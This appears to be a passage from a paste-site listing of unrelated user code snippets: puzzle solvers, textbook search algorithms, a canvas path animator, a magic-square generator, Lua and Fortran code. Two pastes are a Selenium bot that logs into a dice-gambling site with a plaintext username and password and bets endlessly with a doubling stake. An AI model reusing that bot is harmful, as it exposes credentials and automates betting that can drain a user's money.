            # pop from the min-queue
            try:
                i = min(q)
            except Exception as e:
                continue
            try:
                current = q[min(q)].pop()
            except Exception as e:
                del q[min(q)]
                continue
            
            visited[str(current)] = True
            for temp in self.get_next(str(current)):
                if temp in visited:
                    continue
                node = Node(temp)
                if node.g > current.g+1:
                    node.g = current.g+1
                    previous[temp] = str(current)
                node.heuristic(method)
                if not node.f() in q:
                    q[node.f()] = []
                q[node.f()].append(node)

                if temp == goal:
                    solved = True
                    break

        if solved:
            return self.retrieve_path(goal, previous), len(visited)
        return None, len(visited)

    # retrieve the shortest path
    def retrieve_path(self, goal, previous):
        path = [goal]
        current = goal
        while previous[current]:
            path.insert(0, previous[current])
            current = previous[current]
        return path


puzzle = EightPuzzle(_init_state)

# display the current puzzle state 
def display():
    color = 'DeepPink' if puzzle.state != _goal_state else 'green'

    for i in range(9):
        if puzzle.state[i] != '0':
            var[i].set(str(puzzle.state[i]))
            label[i].config(bg=color)
        else:
            var[i].set('')
            label[i].config(bg='white')

# solve 8-puzzle using specific algorithm
def solve():
    for b in button:
        b.configure(state='disabled')
    option.configure(state='disabled')

    run = {1: puzzle.solve_by_BFS,
        2: puzzle.solve_by_IDS,
        3: lambda:puzzle.solve_by_Astar(1)}

    temp = select.get()
    index = 1
    for k,e in _algo.items():
        if e == temp:
            index = k
            break
    
    print('Solving...')
    
    # get solving time
    stime = time.time()
    path, n = run[index]()
    ttime = time.time()

    # if 8-puzzle is unsolvable
    if not path:    
        print('This 8-puzzle is unsolvable!')
        for i in range(9):
            label[i].config(bg='red' if puzzle.state[i] != '0' else 'white')
        for b in button:
            b.configure(state='normal')
        option.configure(state='normal')
        return

    info = 'Algorithm: '+_algo[index]+'\n' \
         + 'Time: '+str(round(ttime-stime, 6))+'s\n' \
         + 'States Explored: '+str(n)+'\n' \
         + 'Shortest Path: '+str(len(path)-1)+' steps.'
    print(info)
    display_procedure(path)    

# demonstrate the shortest path
def display_procedure(path):
    if not path:
        for b in button:
            b.configure(state='normal')
        option.configure(state='normal')
        return
    puzzle.state = path.pop(0)
    display()
    win.after(500, lambda: display_procedure(path)) 

# shuffle the state
def shuffle():
    puzzle.shuffle()
    display()

# reset to the initial state
def reset():
    puzzle.state = copy.deepcopy(_init_state)
    display()

# move with mouse clicking
def move(event):
    text = event.widget.cget('text')
    if not text:
        return
    
    pos = puzzle.state.index(text)
    pos0 = puzzle.state.index('0')
    if _distance[pos0][pos] > 1:
        return

    puzzle.swap(pos)
    display()

#
# Set up of Basic UI
#
win = Tk()
win.geometry('+300+100')
win.title('8-Puzzle')
algoFrame = Frame(win, width=260, relief=RAISED)
algoFrame.pack()
select = StringVar(algoFrame)
select.set(_algo[1]) # default value
option = OptionMenu(algoFrame, select, _algo[1], _algo[2], _algo[3])
option.pack()
board = Frame(win, width=260, height=260, relief=RAISED)
board.pack()
var = [StringVar() for i in range(9)]
label = [Label(board, textvariable=var[i], bg='gray', font=('Calibri', 48)) for i in range(9)]
for i in range(3):
    for j in range(3):
        label[i*3+j].bind(""<Button-1>"", lambda event: move(event))
        label[i*3+j].place(x=85*j+5,y=85*i+5, width=80, height=80)
        
buttonFrame = Frame(win, relief=RAISED, borderwidth=1)
buttonFrame.pack(fill=X, expand=True)
button = []
button.append(Button(buttonFrame, width='8', relief=RAISED, text=""Reset"", command=reset))
button.append(Button(buttonFrame, width='8', relief=RAISED, text=""Random"", command=shuffle))
button.append(Button(buttonFrame, width='8', relief=RAISED, text=""Solve"", command=solve)) # to be initialized
for b in button:
    b.pack(side=LEFT, padx=5, pady=7)


# initialization of the game
def main():
    display()
    win.mainloop()

if __name__ == ""__main__"":
    main()
"
FB3GgCSk,Untitled,Hend_Sayed,Python,Sunday 12th of May 2024 10:44:19 PM CDT,"#AI ALGORISMS 

#1-BFS

#declaring the graph as a dictionary
graph = {
  'S' : [ 'A','B','D'],
  'A' : ['C'],
  'B' : ['D'],
  'C' : ['D','G'],
  'D' : ['G'],
  'G' : []
}
def bfs(graph, start, goal):
    #create a list to store the visited nodes and a queue to store the nodes
    visited = []
    queue = [[start]]
    
    #loop through the queue if it's not empty
    while queue:
        path = queue.pop(0) #remove from the left
        node = path[-1]

        if node == visited:
            continue
        visited.append(node)
        if node == goal:
            return path
        else:
            adjacent_nodes = graph.get(node, [])
            for adjacent_node in adjacent_nodes:
                new_path = path.copy()
                new_path.append(adjacent_node)
                queue.append(new_path)
    return print(""The queue is empty, no solution found."")

solution = bfs(graph,'S','G')
print('Solution is ' , solution)


#2-DFS

#declaring the graph as a dictionary
graph = {
  'S' : [ 'A','B','D'],
  'A' : ['C'],
  'B' : ['D'],
  'C' : ['D','G'],
  'D' : ['G'],
  'G' : []
}
def dfs(graph, start, goal):
    #create a list to store the visited nodes and a stack to store the nodes
    visited = []
    stack = [[start]]
    
    #loop through the stack if it's not empty
    while stack:
        path = stack.pop() #remove from the right
        node = path[-1]

        if node == visited:
            continue
        visited.append(node)
        if node == goal:
            return path
        else:
            adjacent_nodes = graph.get(node, [])
            for adjacent_node in adjacent_nodes:
                new_path = path.copy()
                new_path.append(adjacent_node)
                stack.append(new_path)
    return print(""The stack is empty, no path found."")

solution = dfs(graph,'S','G')
print('Solution is ' , solution)


#3-AlphaBeta
import math

def alpha_beta_minimax(cd, node, alpha, beta, maxt, scr, td):
    if cd == td:
        return scr[node]
    if maxt:
        v = -math.inf
        for child in [node*2, node*2+1]:
            v = max(v, alpha_beta_minimax(cd+1, child, alpha, beta, False, scr, td))
            alpha = max(alpha, v)
            if alpha >= beta:
                break
        return v
    else:
        v = math.inf
        for child in [node*2, node*2+1]:
            v = min(v, alpha_beta_minimax(cd+1, child, alpha, beta, True, scr, td))
            beta = min(beta, v)
            if alpha >= beta:
                break
        return v

scr = []
x = int(input('Enter Total Number of leaf nodes: '))
for i in range(x):
    y = int(input('Enter leaf value: '))
    scr.append(y)

td = math.log(len(scr), 2)
cd = int(input('Enter current depth value: '))
nodev = int(input('Enter node value: '))
alpha = -math.inf
beta = math.inf
maxt = True


answer = alpha_beta_minimax(cd, nodev, alpha, beta, maxt, scr, td)
print('The answer is: ',answer)

#4-GBS

#NOTE that Gready_best_search depends on H_cost only
graph={
    'S':[('A',1),('B',4)],
    'A':[('B',2),('C',5),('G',12)],
    'B':[('C',2)],
    'C':[('G',3)]
}
# The hurestic of each node
H_table={
    'S':7,
    'A':6,
    'B':4,
    'C':2,
    'G':0
}
#To calculate the H_cost of any path
def path_h_cost(path):
    for (node,cost) in path:
       last_node = path[-1][0] #C
       h_cost = H_table[last_node] #2
    return h_cost , last_node    

#to check the path_h_cost function
# path=[('S', 0), ('A', 1), ('C', 5)] 
# print(path_f_cost (path))
#SOLUTION = (2 , C)

def gready_best_search(graph, start, goal):

    visited=[]
    queue=[[(start,0)]]

    while queue:

        queue.sort(key=path_h_cost) #sorting by least f-cost
        path = queue.pop(0) #pop from left
        node = path[-1][0] 
        if node in visited:
            continue
        visited.append(node) 
        if node == goal:
             return path
        else:
            adjacent_nodes = graph.get(node,[])                             
            for (adjacent_node,cost) in adjacent_nodes:
                new_path =path.copy() 
                new_path.append((adjacent_node, cost))
                queue.append(new_path)


solution= gready_best_search(graph, 'S', 'G')
print('Solution is : ', solution)
solution_path = [node for (node,_) in solution] #_ to ignore the cost of nodes
print('The path of Solution : ', solution_path)
print('H_cost of solution is', path_h_cost(solution)[0])

#5-A*
#NOTE that a* depends on F_cost = G_cost + H_cost

graph={
    'S':[('A',1),('B',4)],
    'A':[('B',2),('C',5),('G',12)],
    'B':[('C',2)],
    'C':[('G',3)]
}
# The hurestic of each node
H_table={
    'S':7,
    'A':6,
    'B':4,
    'C':2,
    'G':0
}

#To calculate the F_cost of any path
def path_f_cost(path):
    g_cost= 0
    for (node,cost) in path:
        g_cost += cost
    last_node = path[-1][0] #C
    h_cost = H_table[last_node] #2
    f_cost = g_cost + h_cost
    return f_cost , last_node    

#to check the path_f_cost function
# path=[('S', 0), ('A', 1), ('C', 5)] 
# print(path_f_cost (path))
#SOLUTION = (8 , C)

def a_star_search(graph, start, goal):

    visited=[]
    queue=[[(start,0)]]

    while queue:

        queue.sort(key=path_f_cost) #sorting by least f-cost
        path = queue.pop(0) #pop from left
        node = path[-1][0] 
        if node in visited:
            continue
        visited.append(node) 
        if node == goal:
             return path
        else:
            adjacent_nodes = graph.get(node,[])                             
            for (adjacent_node,cost) in adjacent_nodes:
                new_path =path.copy() 
                new_path.append((adjacent_node, cost))
                queue.append(new_path)


solution= a_star_search(graph, 'S', 'G')
print('Solution is : ', solution)
solution_path = [node for (node,_) in solution] #_ to ignore the cost of nodes
print('The path of Solution : ', solution_path)
print('F_cost of solution is', path_f_cost(solution)[0])

#6-UCS

#NOTE that Uniform_cost_search depends on G_cost of path

#create a function to calculate path_cost
def path_cost(path):
    total_cost = 0
    for (node , cost) in path:
        total_cost += cost
    return total_cost , path[-1][0]

#declaring the graph as a dictionary with it's cost
graph = {
  'S' : [ ('A',2),('B',3),('D',5)],
  'A' : [('C',4)],
  'B' : [('D',4)],
  'C' : [('D',1),('G',2)],
  'D' : [('G',5)],
  'G' : []
}
def ucs(graph, start, goal):
    #create a list to store the visited nodes and a queue to store the nodes
    visited = []
    queue = [[(start,0)]]
    
    #loop through the queue if it's not empty
    while queue:
        queue.sort(key=path_cost) #sorting by lowest path_cost
        path = queue.pop(0)
        node = path[-1][0]

        if node in visited:
            continue
        visited.append(node)
        if node == goal:
            return path
        else:
            adjacent_nodes = graph.get(node, [])
            for (adjacent_node,cost) in adjacent_nodes:
                new_path = path.copy()
                new_path.append((adjacent_node,cost))
                queue.append(new_path)
    return print(""The queue is empty, no solution found."")

solution = ucs(graph,'S','G')
print('Solution is ' , solution)
print('Cost of solution is ' , path_cost(solution)[0])

#7-MinMax

import math
def Minmax(cd,node,maxt,scr,td):
    if(cd==td):
        return scr[node]
    if(maxt):
        return max(Minmax(cd+1,node*2,False,scr,td),Minmax(cd+1,node*2+1,False,scr,td))
    else:
        return min(Minmax(cd+1,node*2,True,scr,td),Minmax(cd+1,node*2+1,True,scr,td))
    
    
scr=[]
x=int(input('Enter Total Nymber of leaf node= '))
for i in range (x):
    y=int(input('Enter leaf value: '))
    scr.append(y)



td=math.log(len(scr),2)
cd=int(input('Enter current depth value: '))
nodev=int(input('Enter node value: '))
maxt=True
print('The answer is : ',end="" "")
answer=Minmax(cd,nodev,maxt,scr,td)
print(answer)





"
xrK7uJsf,snowybot.py,coinwalk,JavaScript,Sunday 12th of May 2024 10:25:01 PM CDT,"#!/usr/bin/env python
# -*- coding: utf-8 -*-
 
import subprocess
import sys
import lambda_function 
import selenium
 
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import Select
from selenium.common.exceptions import NoSuchElementException
import time, re, math
from decimal import Decimal
from selenium.webdriver.firefox.options import Options
 
 
sys.setrecursionlimit(1000000000)
options = Options()
options.add_argument(""--headless"")
driver = webdriver.Firefox(options=options) 
print(""please wait loading page and login"")
driver.get(""https://just-dice.com"")
time.sleep(20)
driver.find_element(By.CSS_SELECTOR, ""a.fancybox-item.fancybox-close"").click()
time.sleep(5)
driver.find_element(By.LINK_TEXT, ""Account"").click()
time.sleep(2)
driver.find_element(By.ID, ""myuser"").clear()
driver.find_element(By.ID, ""myuser"").send_keys(""iamsnow"")
time.sleep(0.01)
driver.find_element(By.ID, ""mypass"").clear()
driver.find_element(By.ID, ""mypass"").send_keys(""future"")
time.sleep(0.01)
driver.find_element(By.ID, ""myok"").click()
time.sleep(20)  
print(""logged in"")
belance = driver.find_element(By.ID, ""pct_balance"").get_attribute(""value"")
freather = 0.0  
fumble = 0.0001
fart = 1
base = 0.0001
tens = (base*10)
sevens = (base*6.9)
eights = (base*7.9)
gold = driver.find_element(By.ID, ""pct_balance"").get_attribute(""value"")
good = ((math.floor(float(gold)/tens))*tens)
print(""should see bets"")
 
def go(): 
    global base
    global tens
    global sevens
    global eights
    balance = driver.find_element(By.ID, ""pct_balance"").get_attribute(""value"")
    global fumble 
    global freather
    global good
    global fart
    global gold
    global belance
    if ((float(balance)>(((math.floor(float(balance)/tens))*tens)+sevens)) and (float(balance)<(((math.floor(float(balance)/tens))*tens)+eights)) and (not (float(balance)==freather))):
        fumble = float(fumble)*2
        freather = float(balance)
    if ((((float(balance)/12)-fumble)<=0) and (float(balance)<(((math.floor(float(balance)/tens))*tens)+sevens))):
        fumble = base
        freather = 0.0
        good = ((math.floor(float(balance)/tens))*tens)
    if ((((float(balance)/12)-fumble)<=0) and (float(balance)>(((math.floor(float(balance)/tens))*tens)+eights))):
        fumble = base
        freather = 0.0
        good = ((math.floor(float(balance)/tens))*tens)
    if ((((float(balance)/12)-fumble)<=0) and (float(balance)>(((math.floor(float(balance)/tens))*tens)+sevens)) and (float(balance)<(((math.floor(float(balance)/tens))*tens)+eights))):
        fumble = base*2
        freather = float(balance)
        good = ((math.floor(float(balance)/tens))*tens)
    if ((((float(belance))-(fumble*24))<=0) and (float(balance)<(((math.floor(float(balance)/tens))*tens)+sevens))):
        fumble = base
        freather = 0.0
        good = ((math.floor(float(balance)/tens))*tens)
    if ((((float(belance))-(fumble*24))<=0) and (float(balance)>(((math.floor(float(balance)/tens))*tens)+eights))):
        fumble = base
        freather = 0.0
        good = ((math.floor(float(balance)/tens))*tens)
    if ((((float(belance))-(fumble*24))<=0) and (float(balance)>(((math.floor(float(balance)/tens))*tens)+sevens)) and (float(balance)<(((math.floor(float(balance)/tens))*tens)+eights))):
        fumble = base*2
        freather = float(balance)
        good = ((math.floor(float(balance)/tens))*tens)
    time.sleep(0.1)
    number = float(fumble)
    rounded_number = f""{number:.8f}""
    driver.find_element(By.ID, ""pct_chance"").clear()
    driver.find_element(By.ID, ""pct_chance"").send_keys(""49.5000"")
    driver.find_element(By.ID, ""pct_bet"").clear()
    driver.find_element(By.ID, ""pct_bet"").send_keys(rounded_number)
    driver.find_element(By.ID, ""a_lo"").click()
    time.sleep(0.8)
    go()
    
if (1==1):
    go()"
HScPesN9,DrawPath.js,Sonnet_Songbird,JavaScript,Sunday 12th of May 2024 09:26:43 PM CDT,"// const canvas = document.getElementById(""canvasView"");
// const ctx = canvas.getContext(""2d""); ÌïÑÏöî.
// Ï∫îÎ≤ÑÏä§Ïóê ÎåÄÌï¥ Ï†ÑÏ≤òÎ¶¨ ÏïåÍ≥†Î¶¨Ï¶òÏù¥ ÌïÑÏöîÌïòÎ©¥ const canvasPostprocessing = () => {}

//


const clearCanvas = function (canvas) {
    const ctx = canvas.getContext('2d');
    ctx.clearRect(0, 0, canvas.width, canvas.height);
    if (typeof canvasPostprocessing !== 'undefined') {
        canvasPostprocessing(canvas);
    }
}

const findPath = function () {
    // Í∞Å Ï†ïÏ†êÍ∞ÑÏùò Ïó∞Í≤∞ÏùÑ ÎÇòÌÉÄÎÇ¥Îäî pathÎ•º ÏãúÏûëÏ†êÏóêÏÑúÎ∂ÄÌÑ∞ ÎÅùÏ†êÍπåÏßÄ ÏàúÏÑúÎåÄÎ°ú Îã¥ÏùÄ Î∞∞Ïó¥ÏùÑ Î∞òÌôò 
};

const drawPath = function () {
    const path = findPath();
    if (path.length === 0) {
        return false;
    }

    drawRouteAnimated(path, ""red"", 3, (500 + path.length * 200)); // pathÎ∞∞Ïó¥, ÏÉâÏÉÅ, ÎëêÍªò, duration
    return true;
};


//offsetÏùÄ Ï∫îÎ≤ÑÏä§ Í∞ùÏ≤¥Ïùò Îç∞Ïù¥ÌÑ∞ÏÖãÏóê Îã¥ÏïÑÏÑú ÏÑ§Ï†ï
const toCoordinate = function () {
    const position = ("""")//pathÎ•º ÌÜµÌï¥ Ï†ïÏ†êÏùÑ Í∞ÄÎ¶¨ÌÇ§Îäî Îß§Í∞úÎ©¥ÏàòÎ•º Î∞õÏïÑ Ï¢åÌëú Ï†ïÎ≥¥Î•º Í∞ÄÏßÑ Ï†ïÏ†êÏùÑ Ï∞æÏïÑÏò¥
    let offsetX = 0;
    let offsetY = 0;
    if (canvas.dataset.offsetX) {
        offsetX = canvas.dataset.offsetX;
    }
    if (canvas.dataset.offsetY) {
        offsetY = canvas.dataset.offsetY;
    }
    return position ? {x: position.x + Number(offsetX), y: position.y + Number(offsetY)} : null;
    //Ï†ïÏ†êÏùò Ï¢åÌëú Ï†ïÎ≥¥(ÏòàÏãúÏóêÏÑ† position.x / position.yÍ∞Ä Ï°¥Ïû¨ÌïúÎã§Í≥† Í∞ÑÏ£º)Ïóê offSetÏùÑ ÎçîÌï®. 
};

const drawAllRoutes = function () {
    clearCanvas(canvas);
    navRepo2D.pathRepo.forEach(function (route) {
        drawRoute([route.posA, route.posB], ""black"", 1);
    });
};
const drawRoute = function (path, color, width) {
    ctx.strokeStyle = color;
    ctx.lineWidth = width;

    ctx.beginPath();
    for (let i = 0; i < path.length - 1; i++) {
        const startPos = toCoordinate(path[i]);
        const endPos = toCoordinate(path[i + 1]);
        if (startPos && endPos) {
            ctx.moveTo(startPos.x, startPos.y);
            ctx.lineTo(endPos.x, endPos.y);
        }
    }
    ctx.stroke();
};

const drawPartialRoute = function (startPos, endPos, color, width, partialLength) {
    const segmentLength = Math.sqrt((endPos.x - startPos.x) ** 2 + (endPos.y - startPos.y) ** 2);
    const ratio = partialLength / segmentLength;
    const partialEndX = startPos.x + (endPos.x - startPos.x) * ratio;
    const partialEndY = startPos.y + (endPos.y - startPos.y) * ratio;
    ctx.strokeStyle = color;
    ctx.lineWidth = width;
    ctx.beginPath();
    ctx.moveTo(startPos.x, startPos.y);
    ctx.lineTo(partialEndX, partialEndY);
    ctx.stroke();
};

const drawRouteAnimated = function (path, color, width, duration) {
    let startTime = null;
    const totalLength = calcLength(path);
    const animateDraw = function (currentTime) {
        if (!startTime) startTime = currentTime;
        let progress = Math.min(1, (currentTime - startTime) / duration);
        const partialLength = progress * totalLength;

        clearCanvas(canvas);
        if (!canvas.dataset.noAllRoutes) {
            drawAllRoutes();
        }
        let remainingLength = partialLength;
        for (let i = 0; i < path.length - 1; i++) {
            const startPos = toCoordinate(path[i]);
            const endPos = toCoordinate(path[i + 1]);
            const segmentLength = calcLength([path[i], path[i + 1]]);
            if (remainingLength >= segmentLength) {
                drawPartialRoute(startPos, endPos, color, width, segmentLength);
                remainingLength -= segmentLength;
            } else {
                const ratio = remainingLength / segmentLength;
                const partialEndPos = {
                    x: startPos.x + (endPos.x - startPos.x) * ratio,
                    y: startPos.y + (endPos.y - startPos.y) * ratio
                };
                drawPartialRoute(startPos, partialEndPos, color, width, remainingLength);
                break;
            }
        }
        if (progress < 1) {
            requestAnimationFrame(animateDraw);
        }
    };
    requestAnimationFrame(animateDraw);
};

const calcLength = function (path) {
    let totalLength = 0;
    for (let i = 0; i < path.length - 1; i++) {
        const startPos = toCoordinate(path[i]);
        const endPos = toCoordinate(path[i + 1]);
        if (startPos && endPos) {
            totalLength += Math.sqrt((endPos.x - startPos.x) ** 2 + (endPos.y - startPos.y) ** 2);
        }
    }
    return totalLength;
};
"
q57aHUXy,snowybot.py,coinwalk,JavaScript,Sunday 12th of May 2024 08:57:49 PM CDT,"#!/usr/bin/env python
# -*- coding: utf-8 -*-
 
import subprocess
import sys
import selenium
 
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import Select
from selenium.common.exceptions import NoSuchElementException
import time, re, math
from decimal import Decimal
from selenium.webdriver.firefox.options import Options
 
options = Options()
options.add_argument(""--headless"")
driver = webdriver.Firefox(options=options)
print(""please wait loading page and login"")
driver.get(""https://just-dice.com"")
time.sleep(20)
driver.find_element(By.CSS_SELECTOR, ""a.fancybox-item.fancybox-close"").click()
time.sleep(5)
driver.find_element(By.LINK_TEXT, ""Account"").click()
time.sleep(2)
driver.find_element(By.ID, ""myuser"").clear()
driver.find_element(By.ID, ""myuser"").send_keys(""iamsnow"")
time.sleep(0.01)
driver.find_element(By.ID, ""mypass"").clear()
driver.find_element(By.ID, ""mypass"").send_keys(""future"")
time.sleep(0.01)
driver.find_element(By.ID, ""myok"").click()
time.sleep(20)  
print(""logged in"")
belance = driver.find_element(By.ID, ""pct_balance"").get_attribute(""value"")
freather = 0.0  
fumble = 0.00000001
fart = 1
base = 0.00000001
tens = (base*10)
sevens = (base*6.9)
eights = (base*7.1)
gold = driver.find_element(By.ID, ""pct_balance"").get_attribute(""value"")
good = ((math.floor(float(gold)/tens))*tens)
print(""should see bets"")
 
def go(): 
    global base
    global tens
    global sevens
    global eights
    balance = driver.find_element(By.ID, ""pct_balance"").get_attribute(""value"")
    global fumble 
    global freather
    global good
    global fart
    global gold
    global belance
    if ((float(balance)>(((math.floor(float(balance)/tens))*tens)+sevens)) and (float(balance)<(((math.floor(float(balance)/tens))*tens)+eights)) and (not (float(balance)==freather))):
        fumble = float(fumble)*2
        freather = float(balance)
    if ((((float(balance)/12)-fumble)<=0) and (float(balance)<(((math.floor(float(balance)/tens))*tens)+sevens))):
        fumble = base
        freather = 0.0
        good = ((math.floor(float(balance)/tens))*tens)
    if ((((float(balance)/12)-fumble)<=0) and (float(balance)>(((math.floor(float(balance)/tens))*tens)+eights))):
        fumble = base
        freather = 0.0
        good = ((math.floor(float(balance)/tens))*tens)
    if ((((float(balance)/12)-fumble)<=0) and (float(balance)>(((math.floor(float(balance)/tens))*tens)+sevens)) and (float(balance)<(((math.floor(float(balance)/tens))*tens)+eights))):
        fumble = base*2
        freather = float(balance)
        good = ((math.floor(float(balance)/tens))*tens)
    if ((((float(belance))-(fumble*24))<=0) and (float(balance)<(((math.floor(float(balance)/tens))*tens)+sevens))):
        fumble = base
        freather = 0.0
        good = ((math.floor(float(balance)/tens))*tens)
    if ((((float(belance))-(fumble*24))<=0) and (float(balance)>(((math.floor(float(balance)/tens))*tens)+eights))):
        fumble = base
        freather = 0.0
        good = ((math.floor(float(balance)/tens))*tens)
    if ((((float(belance))-(fumble*24))<=0) and (float(balance)>(((math.floor(float(balance)/tens))*tens)+sevens)) and (float(balance)<(((math.floor(float(balance)/tens))*tens)+eights))):
        fumble = base*2
        freather = float(balance)
        good = ((math.floor(float(balance)/tens))*tens)
    time.sleep(0.1)
    number = float(fumble)
    rounded_number = f""{number:.8f}""
    driver.find_element(By.ID, ""pct_chance"").clear()
    driver.find_element(By.ID, ""pct_chance"").send_keys(""49.5000"")
    driver.find_element(By.ID, ""pct_bet"").clear()
    driver.find_element(By.ID, ""pct_bet"").send_keys(rounded_number)
    driver.find_element(By.ID, ""a_lo"").click()
    time.sleep(0.8)
    go()
    
if (1==1):
    go()"
qrUmnuv1,magic_square_sums,Python253,Python,Sunday 12th of May 2024 08:47:08 PM CDT,"#!/usr/bin/env python
# -*- coding: utf-8 -*-
# Filename: magic_square_sums.py
# Version: 1.0.0
# Author: Jeoi Reqi

""""""
This script efficiently generates magic squares and computes the sum of each row, column, and diagonal for specified dimension ranges. Key points include:

    Magic Square Generation:
        - The script uses the Siamese method to generate magic squares of various dimensions.

    Sum Calculation:
        - It calculates the sum of each row, column, and diagonal within the generated magic squares.

    User Interface:
        - The script provides a user-friendly menu interface for selecting predefined dimension ranges.

    Terminal Output:
        - It displays the sums of rows, columns, and diagonals to the terminal for the selected dimension range.

    File Saving Option:
        - Additionally, users have the option to save the output data to a file. The filename is dynamically generated based on the selected dimension range.

Requirements:
    - Python3.x

Functions:
    1. magic_square(n): This function generates a magic square of dimension 'n x n' using the Siamese method.
    It calculates the sum of each row, column, and diagonal within the square and returns a formatted string indicating the dimensions & sums of the magic squares in range.

Usage:
    - Run the script in a Python environment.
    - Follow the on-screen prompts to select an option from the menu and input the desired dimension range.
    - The script will then generate magic squares for all odd dimensions within the specified range and display the sums of each row/column/diagonal to the terminal.
    - Optionally, the user can choose to save the output data to a file in the current working directory.

Additional Notes:
    - The script supports predefined dimension ranges ranging from 3x3 to 999x999.
    - Magic squares for dimensions less than 3 or even dimensions are not supported.
    - The sum of each row/column/diagonal is calculated and displayed for each generated magic square.
    - Output data can be saved to a file with a dynamically generated filename based on the selected dimension range.
""""""

import os

# Function to create Magic Square
def magic_square(n):
    if n < 3:
        return ""- Magic squares for dimensions less than 3 are not supported by this algorithm!\n""
    elif n % 2 == 0:
        return ""- Even dimension values are not supported by this algorithm!\n""

    # Initialize the magic square with zeros
    magicSquare = []
    for i in range(n):
        listt = []
        for j in range(n):
            listt.append(0)
        magicSquare.append(listt)

    # Initialize starting position
    i = n // 2
    j = n - 1

    # Set the number of elements to insert
    num = n * n
    count = 1

    # Populate the magic square
    while count <= num:
        if i == -1 and j == n:  # condition 4
            j = n - 2
            i = 0
        else:
            if j == n:  # column value is exceeding
                j = 0

            if i < 0:  # row  is becoming -1
                i = n - 1

        # Check if cell is occupied
        if magicSquare[i][j] != 0:
            j = j - 2
            i = i + 1
            continue

        else:
            magicSquare[i][j] = count
            count += 1

        # Move to the next cell
        i = i - 1
        j = j + 1  # condition 1

    # Calculate the sum of each row, column, and diagonal
    row_sums = [sum(row) for row in magicSquare]
    col_sums = [sum(col) for col in zip(*magicSquare)]
    diagonal_sum_1 = sum(magicSquare[i][i] for i in range(n))
    diagonal_sum_2 = sum(magicSquare[i][n - i - 1] for i in range(n))

    return f""The magic square {n}x{n} sum of each row/column/diagonal is: {sum(row_sums)}\n""

if __name__ == ""__main__"":
    """"""
    Main function to execute the script.
    """"""
    print(""   :: MAGIC SQUARES GENERATOR ::\n"")
    print(""\t:: Options Menu :"")
    print(""    ___________________________\n"")
    print(""    Option 1:     3x3 - 9x9"")
    print(""    Option 2:   11x11 - 31x31"")
    print(""    Option 3:   33x33 - 99x99"")
    print(""    Option 4: 101x101 - 315x315"")
    print(""    Option 5: 317x317 - 999x999"")  # This Option Will Take Some Time
    print(""    Option 6: !SHOW ALL RANGES!"")  # This Option Will Take Alot Of Time
    print(""    ___________________________"")

    option = int(input(""\n    Enter the option number: ""))
    output_data = """"
    start_range = 0
    end_range = 0

    if option == 1:
        start_range = 3
        end_range = 9
    elif option == 2:
        start_range = 11
        end_range = 31
    elif option == 3:
        start_range = 33
        end_range = 99
    elif option == 4:
        start_range = 101
        end_range = 315
    elif option == 5:
        print(
            ""\n\tThis Option Will Take Some Time...\n\tThank You For Your Patience!\n""
        )
        start_range = 317
        end_range = 999
    elif option == 6:
        print(
            ""\n\tThis Option Will Take Alot Of Time...\n\tThank You For Your Patience!\n""
        )
        start_range = 3
        end_range = 999
    else:
        print(""\nInvalid option selected!\n"")

    for n in range(start_range, end_range + 1, 2):
        output_data += magic_square(n)

    print(output_data)

    # Save the output sums of the given ranges to a dynamically named file in the curent working directory
    save_file = input(
        ""\nDo you want to save the output to a file?\n\n1: Yes\n2: No\n\nMake your selection (1 or 2): ""
    )
    if save_file == ""1"":
        file_name = (
            f""magic_square_{start_range}x{start_range}_to_{end_range}x{end_range}.txt""
        )
        with open(file_name, ""w"") as file:
            file.write(output_data)
        print(f""Output saved to {file_name} in the current directory!\n"")
    elif save_file == ""2"":
        print(""\nOutput not saved!\n"")
    else:
        print(""\nInvalid input. Output not saved!\n"")

"
7Ss62UmS,Backrooms Code Requester,iNxmi,Lua,Sunday 12th of May 2024 08:35:14 PM CDT,"local socket = require ""socket""
 
function getCode(id, location)
	local id, protocol, table = socket.request(id, nil, {location = location})
    return table[""code""]
end

return {
	getCode = getCode
}"
m3itbF8w,Backrooms Code Server,iNxmi,Lua,Sunday 12th of May 2024 08:31:56 PM CDT,"local socket = require ""socket""
 
function generateCode()
    local request = http.get(
        ""https://www.random.org/integers/?num=4&min=0&max=9&col=1&base=10&format=plain&rnd=new""
    )
 
    local text = request.readAll()
 
    return string.gsub(text, ""\n"", """")
end
 
local codes = {
    pool_door = generateCode()
}
print(textutils.serializeJSON(codes))
 
function response(id, protocol, table)
    local location = table[""location""]
    return codes[location]
end
 
while true do 
    print(""Listening on port "" .. os.computerID())
    
    local id, protocol, table = socket.receive()
    print(string.format(""id=%s protocol=%s table=%s"", id, protocol, table))
    local response = response(id, protocol, table)
    
    local data = {success = false, error = ""bad request""}
    if response ~= nil then
        data = {success = true, code = response}
    end
    
    print(data)
    socket.send(id, ""code"", data)
end
 
print(""Server stopped"")"
90aKF1YC,Degree_row_module,Oppaceted,Fortran,Sunday 12th of May 2024 08:27:45 PM CDT,"module Degree_row_module
    contains
    !
    subroutine output(string,x,n,y,d)
        integer :: string,i
        integer :: n(string)
        real(8) :: x(string),y(string),d(string)
        character(len = 72) :: cap = '+----+----------+------+----------+---------------+'
        write (*,'(a)') cap
        write (*,'(a)') '|  i |    x{i}  | n{i} |   y{i}   |      d{i}     |'
        do i = 1,string
            write (*,'(a)') cap
            write (*,'(a, i3, a, f10.6, a, i6, a, f10.6, a, es15.6, a)') '|', i, ' |', x(i), '|', n(i), '|', y(i),'|',d(i),'|'
        end do
        write (*,'(a)') cap
    end subroutine
    !
    subroutine ryad(str, x, n, y, d, E)
        integer :: str
        real(8) :: x(str), y(str), d(str)
        integer :: n(str)
        integer :: i
        real(8) :: E, ui
        do i =1, str
            n(i) = 0
            y(i) = log(2.0d0)
            ui = -1.0d0
            do while ( (abs(ui) >= (E * abs( y(i) ) ) ) .and. (n(i)<2500) )
                n(i) = n(i) + 1
                ui = -ui*x(i)*(0.5d0)
                y(i) = y(i) + ui/n(i)
            end do
            d(i) = abs( y(i)-log(x(i) + 2.0) )
        end do
    end subroutine
end module
"
1WkQuUHR,main,Oppaceted,Fortran,Sunday 12th of May 2024 08:26:55 PM CDT,"!
program main
    use Degree_row_module
    implicit none
    integer :: str, i
    integer, allocatable :: n(:)
    real(8), allocatable :: x(:), y(:), d(:)
    real(8) :: low, high
    real(8), parameter :: E = 1.0e-15
    !
    write (*,'(a$)') 'Enter number of strings: '
    read (*,*) str
    write (*,'(a$)') 'Enter low and high: '
    read (*,*) low, high
    !
